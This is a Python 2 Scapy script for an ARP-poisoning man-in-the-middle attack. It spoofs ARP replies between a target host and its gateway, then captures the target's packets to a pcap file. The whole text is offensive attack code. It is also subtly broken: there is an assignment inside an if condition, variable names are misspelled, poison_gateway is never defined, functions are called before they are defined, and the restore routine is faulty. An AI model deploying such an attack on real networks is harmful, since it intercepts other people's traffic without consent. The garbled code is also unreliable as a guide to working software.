from scapy.all import *
import os
import sys
import threading
import signal

interface ="end1"
target_ip ="172.16.1.71"
gateway_ip="172.16.1.254"
packet_count=1000

conf.iface = interface
conf.verb=0
print"[*] Setting up%s"% interface
gateway_mac = get_mac(gateway_ip)
if gateway_mac = get_mac(gateway_ip):
    print "[!!!]failed to get gateway Mac. Exiting"
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)
traget_mac = get_mac(target_ip)
if target_mac is None:
    print "[!!!] failed to get gateway Mac. Exiting"
    sys.exit(0)
else:
    print "[*] target %s is at %s" % (target_ip,target_mac)
poison_thread = threading.Thread(target = poison_target, args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()
try:
    print "[*] Starting sniffer for %d packets" % packet_count
    bpt_sniff = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
    wrpcap('arper.pcap',packets)
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    os.kill(os.getpid(), signal.SIGINT)
def get_mac(ip_address):
    responses,unanswered = \srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src
        return None
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op    =2
    poison_target.psrc  =gateway_ip
    poison_target.pdst  =target_ip
    poison_target.hwdst =target_mac
    
    poison_target = ARP()
    poison_target.op    =2
    poison_target.psrc  =target_ip
    poison_target.pdst  =gateway_ip
    poison_target.hwdst =gateway_mac
    
    print "[*] Beginning the ARP poison. [CTRL-C to stop]"
    
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    print "[*] ARP poison attack finished"
    return